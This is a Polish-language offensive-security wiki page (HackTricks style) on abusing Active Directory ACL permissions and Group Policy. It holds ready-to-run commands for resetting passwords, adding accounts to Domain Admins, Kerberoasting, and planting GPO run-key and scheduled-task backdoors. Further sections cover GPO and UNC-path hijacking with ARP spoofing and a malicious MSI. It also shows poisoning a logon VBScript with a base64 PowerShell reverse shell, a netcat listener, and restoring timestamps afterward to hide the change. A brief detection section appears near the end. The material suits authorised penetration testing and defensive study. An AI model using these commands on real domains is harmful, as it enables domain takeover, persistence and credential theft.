# Nadużywanie ACL/ACE Active Directory

{{#include ../../../banners/hacktricks-training.md}}

**Ta strona jest głównie podsumowaniem technik opisanych w** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **oraz** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Więcej informacji znajdziesz w oryginalnych artykułach.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **Uprawnienia GenericAll do użytkownika**

To uprawnienie zapewnia atakującemu pełną kontrolę nad docelowym kontem użytkownika. Po potwierdzeniu uprawnień `GenericAll` za pomocą polecenia `Get-ObjectAcl` atakujący może:

- **Zmienić hasło docelowego użytkownika**: Za pomocą polecenia `net user <username> <password> /domain` atakujący może zresetować hasło użytkownika.
- Z systemu Linux można zrobić to samo za pośrednictwem SAMR, używając Samba `net rpc`:<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **Jeśli konto jest wyłączone, wyczyść flagę UAC**: `GenericAll` umożliwia edycję `userAccountControl`. Z systemu Linux BloodyAD może usunąć flagę `ACCOUNTDISABLE`:<sup>[[8]](#references)[[10]](#references)</sup>
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: Przypisz SPN do konta użytkownika, aby można było przeprowadzić na nim kerberoasting, a następnie użyj Rubeus i targetedKerberoast.py do wyodrębnienia i próby złamania hashy ticket-granting ticket (TGT).
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Wyłącz pre-authentication dla użytkownika, narażając jego konto na ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: Mając uprawnienia `GenericAll` do użytkownika, można dodać poświadczenie oparte na certyfikacie i uwierzytelnić się jako ten użytkownik bez zmiany jego hasła. Zobacz:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Uprawnienia GenericAll do grupy**

To uprawnienie pozwala atakującemu modyfikować członkostwo w grupie, jeśli ma on uprawnienia `GenericAll` do grupy takiej jak `Domain Admins`. Po zidentyfikowaniu wyróżniającej nazwy grupy za pomocą `Get-NetGroup` atakujący może:

- **Dodać siebie do grupy Domain Admins**: Można to zrobić za pomocą bezpośrednich poleceń lub modułów takich jak Active Directory albo PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Z systemu Linux możesz również wykorzystać BloodyAD, aby dodać siebie do dowolnych grup, jeśli masz wobec nich uprawnienia członkostwa GenericAll/Write. Jeśli docelowa grupa jest zagnieżdżona w grupie „Remote Management Users”, natychmiast uzyskasz dostęp WinRM do hostów honorujących tę grupę:<sup>[[8]](#references)</sup>
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write na komputerze/użytkowniku**

Posiadanie tych uprawnień do obiektu komputera lub konta użytkownika umożliwia:

- **Kerberos Resource-based Constrained Delegation**: Umożliwia przejęcie obiektu komputera.
- **Shadow Credentials**: Użycie tej techniki do podszywania się pod konto komputera lub użytkownika poprzez wykorzystanie uprawnień do tworzenia shadow credentials.

## **WriteProperty w grupie**

Jeśli użytkownik ma uprawnienia `WriteProperty` do wszystkich obiektów dla określonej grupy (np. `Domain Admins`), może:

- **Dodanie siebie do grupy Domain Admins**: Możliwe poprzez połączenie poleceń `net user` i `Add-NetGroupUser`; metoda ta umożliwia eskalację uprawnień w domenie.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

To uprawnienie umożliwia atakującym dodanie samych siebie do określonych grup, takich jak `Domain Admins`, za pomocą poleceń, które bezpośrednio modyfikują członkostwo w grupie. Poniższa sekwencja poleceń umożliwia dodanie samego siebie:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Podobne uprawnienie pozwala atakującym bezpośrednio dodawać siebie do grup poprzez modyfikowanie właściwości grup, jeśli mają oni uprawnienie `WriteProperty` do tych grup. Potwierdzenie i wykonanie tego uprawnienia odbywa się za pomocą:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Posiadanie prawa `ExtendedRight` dla użytkownika w zakresie `User-Force-Change-Password` umożliwia resetowanie haseł bez znajomości bieżącego hasła. Weryfikację tego prawa i jego wykorzystanie można przeprowadzić za pomocą PowerShell lub alternatywnych narzędzi wiersza poleceń, korzystając z kilku metod resetowania hasła użytkownika, w tym sesji interaktywnych i one-linerów dla środowisk nieinteraktywnych. Polecenia obejmują zarówno proste wywołania PowerShell, jak i użycie `rpcclient` w systemie Linux, pokazując różnorodność wektorów ataku.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner on Group**

Jeśli attacker odkryje, że ma uprawnienia `WriteOwner` względem grupy, może zmienić właściciela grupy na siebie. Jest to szczególnie istotne, gdy daną grupą jest `Domain Admins`, ponieważ zmiana właściciela umożliwia szerszą kontrolę nad atrybutami grupy i jej członkostwem. Proces obejmuje zidentyfikowanie właściwego obiektu za pomocą `Get-ObjectAcl`, a następnie użycie `Set-DomainObjectOwner` w celu zmodyfikowania właściciela — przy użyciu SID lub nazwy.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite dla User**

To uprawnienie pozwala atakującemu modyfikować właściwości użytkownika. W szczególności, mając dostęp `GenericWrite`, atakujący może zmienić ścieżkę skryptu logowania użytkownika, aby wykonać złośliwy skrypt podczas logowania użytkownika. Osiąga się to za pomocą polecenia `Set-ADObject`, aktualizując właściwość `scriptpath` docelowego użytkownika tak, aby wskazywała na skrypt atakującego.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Dzięki temu uprawnieniu atakujący mogą modyfikować członkostwo w grupach, na przykład dodawać siebie lub innych użytkowników do określonych grup. Proces ten obejmuje utworzenie obiektu poświadczeń, użycie go do dodania lub usunięcia użytkowników z grupy oraz zweryfikowanie zmian członkostwa za pomocą poleceń PowerShell.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Z systemu Linux narzędzie Samba `net` może dodawać/usuwać członków, gdy masz uprawnienie `GenericWrite` do grupy (przydatne, gdy PowerShell/RSAT są niedostępne):<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

Posiadanie obiektu AD oraz uprawnień `WriteDACL` do niego umożliwia atakującemu nadanie sobie uprawnień `GenericAll` względem tego obiektu. Osiąga się to poprzez manipulację ADSI, zapewniającą pełną kontrolę nad obiektem i możliwość modyfikowania członkostwa w jego grupach. Mimo to istnieją ograniczenia podczas próby wykorzystania tych uprawnień za pomocą cmdletów `Set-Acl` / `Get-Acl` modułu Active Directory.<sup>[[4]](#references)[[7]](#references)</sup>
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### Szybkie przejęcie WriteDACL/WriteOwner (PowerView)

Gdy masz `WriteOwner` i `WriteDacl` w odniesieniu do konta użytkownika lub konta usługi, możesz uzyskać nad nim pełną kontrolę i zresetować jego hasło za pomocą PowerView bez znajomości starego hasła:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Uwagi:
- Jeśli masz tylko `WriteOwner`, może być konieczna wcześniejsza zmiana właściciela na siebie:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Zweryfikuj dostęp za pomocą dowolnego protokołu (SMB/LDAP/RDP/WinRM) po zresetowaniu hasła.

## **Replikacja w domenie (DCSync)**

Atak DCSync wykorzystuje określone uprawnienia replikacji w domenie, aby naśladować Domain Controller i synchronizować dane, w tym dane uwierzytelniające użytkowników. Ta zaawansowana technika wymaga uprawnień takich jak `DS-Replication-Get-Changes`, umożliwiając atakującym wyodrębnianie poufnych informacji ze środowiska AD bez bezpośredniego dostępu do Domain Controller.<sup>[[5]](#references)</sup> [**Dowiedz się więcej o ataku DCSync tutaj.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Delegowany dostęp do zarządzania Group Policy Objects (GPO) może stwarzać poważne zagrożenia bezpieczeństwa. Na przykład jeśli użytkownik taki jak `offense\spotless` otrzyma delegowane uprawnienia do zarządzania GPO, może posiadać uprawnienia takie jak **WriteProperty**, **WriteDacl** i **WriteOwner**. Uprawnienia te mogą zostać wykorzystane do złośliwych celów, co można wykryć za pomocą PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### Wyliczanie uprawnień GPO

Aby zidentyfikować nieprawidłowo skonfigurowane GPO, można łączyć ze sobą cmdlets narzędzia PowerSploit. Umożliwia to wykrywanie GPO, którymi konkretny użytkownik ma uprawnienia zarządzać: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Komputery, do których zastosowano daną politykę**: Możliwe jest ustalenie, do których komputerów odnosi się konkretne GPO, co pomaga zrozumieć zakres potencjalnego wpływu. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Polityki zastosowane do danego komputera**: Aby sprawdzić, jakie polityki zastosowano do konkretnego komputera, można użyć poleceń takich jak `Get-DomainGPO`.

**OU, do których zastosowano daną politykę**: Jednostki organizacyjne (OU), na które wpływa dana polityka, można zidentyfikować za pomocą `Get-DomainOU`.

Możesz również użyć narzędzia [**GPOHound**](https://github.com/cogiceo/GPOHound) do wyliczania GPO i znajdowania w nich problemów.

### Abuse GPO - New-GPOImmediateTask

Nieprawidłowo skonfigurowane GPO można wykorzystać do wykonywania kodu, na przykład przez utworzenie natychmiastowego zaplanowanego zadania. Można w ten sposób dodać użytkownika do lokalnej grupy administratorów na zaatakowanych komputerach, znacznie podnosząc uprawnienia:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

Moduł GroupPolicy, jeśli jest zainstalowany, umożliwia tworzenie i linkowanie nowych GPO oraz ustawianie preferencji, takich jak wartości rejestru, w celu wykonywania backdoorów na zaatakowanych komputerach. Ta metoda wymaga zaktualizowania GPO oraz zalogowania się użytkownika na komputerze w celu wykonania:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Nadużywanie GPO

SharpGPOAbuse oferuje metodę nadużywania istniejących GPO poprzez dodawanie zadań lub modyfikowanie ustawień bez konieczności tworzenia nowych GPO. To narzędzie wymaga modyfikacji istniejących GPO lub użycia narzędzi RSAT do utworzenia nowych przed zastosowaniem zmian:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Wymuszenie aktualizacji zasad

Aktualizacje GPO zazwyczaj odbywają się mniej więcej co 90 minut. Aby przyspieszyć ten proces, szczególnie po wprowadzeniu zmiany, na komputerze docelowym można użyć polecenia `gpupdate /force`, aby wymusić natychmiastową aktualizację zasad. Polecenie to zapewnia zastosowanie wszelkich modyfikacji GPO bez oczekiwania na kolejny automatyczny cykl aktualizacji.

### Pod maską

Po sprawdzeniu Scheduled Tasks dla danego GPO, takiego jak `Misconfigured Policy`, można potwierdzić dodanie zadań, takich jak `evilTask`. Zadania te są tworzone za pomocą skryptów lub narzędzi wiersza poleceń w celu modyfikowania zachowania systemu lub eskalacji uprawnień.

Struktura zadania, przedstawiona w pliku konfiguracyjnym XML wygenerowanym przez `New-GPOImmediateTask`, określa szczegóły zaplanowanego zadania — w tym polecenie, które ma zostać wykonane, oraz jego wyzwalacze. Plik ten przedstawia sposób definiowania i zarządzania Scheduled Tasks w ramach GPO, zapewniając metodę wykonywania dowolnych poleceń lub skryptów jako części egzekwowania zasad.

### Użytkownicy i grupy

GPO umożliwiają również manipulowanie członkostwem użytkowników i grup w systemach docelowych. Poprzez bezpośrednią edycję plików zasad Users and Groups atakujący mogą dodawać użytkowników do uprzywilejowanych grup, takich jak lokalna grupa `administrators`. Jest to możliwe dzięki delegowaniu uprawnień do zarządzania GPO, które pozwala modyfikować pliki zasad w celu dodawania nowych użytkowników lub zmiany członkostwa w grupach.

Plik konfiguracyjny XML dla Users and Groups opisuje sposób implementacji tych zmian. Dodając wpisy do tego pliku, można nadać określonym użytkownikom podwyższone uprawnienia w zaatakowanych systemach. Metoda ta zapewnia bezpośredni sposób eskalacji uprawnień poprzez manipulowanie GPO.

Ponadto można rozważyć dodatkowe metody wykonywania kodu lub utrzymywania persistence, takie jak wykorzystywanie skryptów logowania/wylogowania, modyfikowanie kluczy rejestru dla autorun, instalowanie oprogramowania za pomocą plików .msi lub edytowanie konfiguracji usług. Techniki te zapewniają różne możliwości utrzymywania dostępu i kontrolowania systemów docelowych poprzez nadużywanie GPO.

### Przekierowywanie pobierania GPC/GPT do uwierzytelnionych rogue services

GPO składa się z obiektu LDAP **Group Policy Container (GPC)** zawierającego metadane oraz hostowanego przez SMB **Group Policy Template (GPT)** zawierającego pliki zasad. Podczas odświeżania klient korzysta z `gPLink` kontenera, odczytuje wskazany GPC oraz jego `gPCFileSysPath`, a następnie pobiera GPT ze wskazanej ścieżki UNC. W konsekwencji dostęp do zapisu samego GPC lub `gPLink` jednostki OU, Site albo Domain można przekształcić w uprzywilejowane przetwarzanie zasad.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### Zatrucie `gPCFileSysPath` za pomocą GPOddity

Jeśli kontrolowany principal może zapisywać docelowy GPC (bezpośrednio lub za pośrednictwem **NTLM relay to LDAP**), należy zastąpić `gPCFileSysPath` ścieżką UNC hostowaną przez atakującego. [GPOddity](https://github.com/synacktiv/GPOddity) automatyzuje zmianę LDAP i udostępnia złośliwy GPT zawierający oparte na modułach pliki zasad lub Immediate Task, który klient Group Policy wykonuje jako `NT AUTHORITY\SYSTEM`.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

Anonimowy udział SMB lub udział niewymagający poświadczeń nie jest wystarczający na obecnych klientach Windows: SMB Secure Negotiate wymaga dowodu pomyślnego uwierzytelnienia, dlatego rogue service musi zweryfikować tożsamość domenową, wyprowadzić klucz sesji SMB i prawidłowo podpisywać swoje odpowiedzi. W trybie embedded skonfiguruj GPOddity przy użyciu kontrolowanego konta komputera i jego klucza usługi, a następnie wybierz payload po stronie komputera lub użytkownika w sekcji `[COMMANDS]`.<sup>[[15]](#references)[[16]](#references)</sup>
```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```
**Przypadek brzegowy User GPO:** po MS16-072 Windows nadal tworzy dwie sesje SMB2 w ramach **tego samego połączenia TCP**: sesja użytkownika odczytuje `GPT.INI`, a następnie sesja konta komputera odczytuje efektywną konfigurację, taką jak `ScheduledTasks.xml`. Rogue server musi więc indeksować stan uwierzytelniania, klucze sesji i klucze podpisywania według `SessionId` SMB2, a nie tylko według socketu. Fork Scapy osadzony w GPOddity/OUned implementuje to za pomocą `SMBStreamSocketMultiplexing` oraz obsługującego multipleksowanie `SMBServer`; servery Impacket/Scapy obsługujące pojedynczą sesję w przeciwnym razie ponownie używają nieprawidłowego stanu podpisywania i zawodzą przy politykach użytkownika.<sup>[[15]](#references)</sup>

#### `gPLink` poisoning z OUned

Mając `WriteGPLink`, `GenericWrite` lub równoważną kontrolę nad OU, Site albo Domain, attacker może dodać odnośnik, którego GPC DN jest obsługiwany przez kontrolowany przez attackera host LDAP. Ta technika została pierwotnie przedstawiona przez Petrosa Koutroumpisa; [OUned](https://github.com/synacktiv/OUned) automatyzuje zapis LDAP oraz łańcuch złośliwych GPC/GPT.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>
```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```
Ofiara najpierw uwierzytelnia się w złośliwej usłudze LDAP i otrzymuje GPC, którego `gPCFileSysPath` wskazuje na złośliwą usługę SMB; następnie uwierzytelnia się w SMB i stosuje dostarczony GPT. OUned potrzebuje więc konta z LDAP SPN, konta komputera z HOST SPN dla SMB (to samo konto komputera może spełniać oba wymagania) oraz rozwiązywania nazw DNS lub przekierowania zwrotnego, które kieruje porty 389 i 445 do hosta operatora.<sup>[[15]](#references)[[17]](#references)</sup>
```bash
python3 OUned.py --config config.ini -v
```
Wbudowany serwer LDAP Scapy firmy OUned weryfikuje Kerberos/SPNEGO przy użyciu rzeczywistego klucza kontrolowanej usługi i udostępnia dowolne dane GPC z JSON. Pusty klucz JSON odwzorowuje rootDSE, prefiksy `base64:` reprezentują wartości binarne, a serwer obsługuje operacje add/delete/modify/search oraz wyszukiwania `BASE`, `LEVEL` i `SUBTREE`; może negocjować brak ochrony, integralność albo poufność. Dzięki temu usługa nadaje się do ponownego użycia, gdy inny komponent Windows podąża za referencją LDAP kontrolowaną przez atakującego, ale wymaga uwierzytelnionego LDAP.<sup>[[15]](#references)</sup>

Nie zakładaj, że synchronizacja hasła konta z dummy domain odtworzy każdy klucz Kerberos: RC4 jest wyprowadzany z hasła, natomiast AES string-to-key wykorzystuje również sól wyprowadzoną z hostname/domain principala. Dostarczenie rzeczywistego klucza AES konta do `KerberosSSP` pozwala uniknąć wymuszania RC4 poprzez wykrywalną zmianę w samodzielnie zapisywalnym przez konto komputera `msDS-SupportedEncryptionTypes`.<sup>[[15]](#references)</sup>

#### Punkty wykrywania

Koreluj zmiany `gPCFileSysPath` lub `gPLink` ze zmianami wersji GPO oraz nowymi plikami XML Immediate/Scheduled Task. Analizuj odwołania do nieoczekiwanych naming contexts, hostów UNC spoza zatwierdzonego zestawu DC/SYSVOL, rekordów DNS przekierowujących nazwy kont komputerów, biletów usług LDAP/CIFS dla nietypowych kont komputerów oraz zmian `msDS-SupportedEncryptionTypes` włączających RC4.<sup>[[15]](#references)</sup>

### WriteGPLink + UNC path hijacking (ARP spoofing)

`WriteGPLink` w OU/domenie pozwala zmodyfikować atrybut `gPLink` docelowego kontenera i **wymusić zastosowanie istniejącego GPO** bez edytowania samego GPO. Staje się to interesujące, gdy połączone GPO już odwołuje się do zdalnej zawartości za pośrednictwem **ścieżek UNC** (`\\HOST\share\...`), ponieważ uwierzytelnieni użytkownicy mogą odczytywać **SYSVOL** i offline wyszukiwać zasady nadające się do ponownego użycia.<sup>[[11]](#references)</sup>

Workflow wysokiego poziomu:

1. Użyj BloodHound, aby zidentyfikować principal z `WriteGPLink` w OU i wyliczyć komputery/użytkowników znajdujących się w tym OU.
2. Sklonuj `SYSVOL` w trybie tylko do odczytu i przeanalizuj GPO w poszukiwaniu **Software Installation**, **mapowań dysków** (`Drives.xml`) oraz **skryptów logon/startup**, które odwołują się do ścieżek UNC.
3. Preferuj zasady wskazujące na **bezpośredni hostname** (na przykład `\\DC02\share\pkg.msi`) zamiast ścieżek DFS/domain-namespace, ponieważ ścieżki oparte na hostname są łatwiejsze do przekierowania za pomocą spoofingu L2.
4. Dodaj GUID wybranego GPO do `gPLink` docelowego OU, aby ofiara przetworzyła tę już istniejącą zasadę.
5. W tej samej domenie rozgłoszeniowej wykonaj ARP spoofing hosta UNC i lokalnie przypisz jego IP (`ip addr add <target_ip>/32 dev <iface>`), aby ruch SMB ofiary docierał do twojego hosta.
6. Udostępnij oczekiwaną ścieżkę/nazwę pliku z serwera SMB atakującego (na przykład `smbserver.py`) i zaczekaj na normalne przetwarzanie zasad.

Przykład zbierania `SYSVOL` i korelacji GPO:
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
Połącz istniejący GPO z docelowym OU:
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Software Installation UNC hijack -> SYSTEM

Jeśli powiązany GPO wdraża plik MSI ze ścieżki UNC, klient pobierze go podczas **uruchamiania komputera** i zainstaluje jako **`NT AUTHORITY\SYSTEM`**. Podszywając się pod wskazany host i udostępniając złośliwy MSI pod **tą samą nazwą udziału/ścieżki/pliku**, można przekształcić `WriteGPLink` w wykonanie kodu z uprawnieniami SYSTEM **bez modyfikowania SYSVOL**.

Ważne ograniczenia:

- **Czas ma znaczenie**: nowy link jest wykrywany podczas odświeżania zasad (zwykle co około 90 minut), ale **Software Installation** zazwyczaj uruchamia się podczas **restartu**.
- Windows Installer zazwyczaj śledzi wdrożenie za pomocą **`ProductCode`**. Jeśli produkt jest już zainstalowany, wdrożenie może zostać pominięte.
- Aby uniknąć odrzucenia przez instalator, zmodyfikuj złośliwy MSI tak, aby jego **`ProductCode`** i **`PackageCode`** odpowiadały wartościom oczekiwanym przez legalny pakiet skonfigurowany w GPO.
- Stare pliki reklam `.aas` mogą nadal pozostać w `SYSVOL`, dlatego przed poleganiem na wdrożeniu sprawdź, czy nadal wygląda ono na aktywne.
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

Mapowania dysków GPP w `Drives.xml` powodują, że użytkownicy uwierzytelniają się do skonfigurowanej ścieżki UNC podczas logowania lub ponownego połączenia. Jeśli podszyjesz się pod wskazany host, możesz przechwycić **NetNTLMv2**. Jeśli SMB zostanie celowo doprowadzony do niepowodzenia, Windows może ponowić próbę przez **WebDAV**, wysyłając **NTLM przez HTTP**, co zapewnia znacznie większą elastyczność w przypadku relay do **LDAP(S)**, **AD CS** lub **SMB**.

#### Logon/startup script UNC hijack

Ten sam schemat dotyczy skryptów hostowanych w UNC, znalezionych w `SYSVOL`:

- **Skrypty logowania** są zwykle wykonywane w kontekście **użytkownika**.
- **Skrypty startowe** są zwykle wykonywane w kontekście **komputera / SYSTEM**.

Jeśli ścieżka skryptu wskazuje na host o możliwej do sfałszowania nazwie, przekieruj host UNC i udostępnij zastępczą treść skryptu z oczekiwanej lokalizacji.

## SYSVOL/NETLOGON Logon Script Poisoning

Zapisywalne ścieżki w `\\<dc>\SYSVOL\<domain>\scripts\` lub `\\<dc>\NETLOGON\` umożliwiają modyfikowanie skryptów logowania wykonywanych podczas logowania użytkownika za pośrednictwem GPO. Prowadzi to do wykonania kodu w kontekście bezpieczeństwa logujących się użytkowników.

### Znajdowanie skryptów logowania
- Sprawdź atrybuty użytkowników pod kątem skonfigurowanego skryptu logowania:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Przeskanuj udziały domenowe, aby znaleźć skróty lub odwołania do skryptów:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- Przeanalizuj pliki `.lnk`, aby ustalić cele wskazujące na SYSVOL/NETLOGON (przydatna sztuczka DFIR oraz dla atakujących bez bezpośredniego dostępu do GPO):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound wyświetla atrybut `logonScript` (scriptPath) na węzłach użytkowników, jeśli jest ustawiony.

### Validate write access (don’t trust share listings)
Automatyczne narzędzia mogą wskazywać SYSVOL/NETLOGON jako tylko do odczytu, ale bazowe ACL NTFS nadal mogą zezwalać na zapis. Zawsze testuj:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
Jeśli rozmiar pliku lub mtime się zmieni, masz uprawnienia do zapisu. Zachowaj oryginały przed modyfikacją.

### Zatruj VBScript logowania w celu uzyskania RCE
Dołącz polecenie uruchamiające reverse shell PowerShell (wygeneruj je na revshells.com) i zachowaj oryginalną logikę, aby nie zakłócić działania biznesowego:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Nasłuchuj na swoim hoście i czekaj na następne interaktywne logowanie:
```bash
rlwrap -cAr nc -lnvp 443
```
- Wykonanie odbywa się przy użyciu tokenu użytkownika logującego się (nie SYSTEM). Zakres obejmuje link GPO (OU, site, domenę), w ramach którego stosowany jest ten skrypt.
- Po użyciu przywróć pierwotną zawartość i znaczniki czasu.

## References

- [1] [Nadużywanie ACL/ACE w Active Directory](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Konta uprzywilejowane i uprawnienia tokenów](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – aktualizacja ścieżek ataków ACL](https://wald0.com/?p=112)
- [4] [Wyliczenie ActiveDirectoryRights - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Eskalacja uprawnień za pomocą ACL w Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
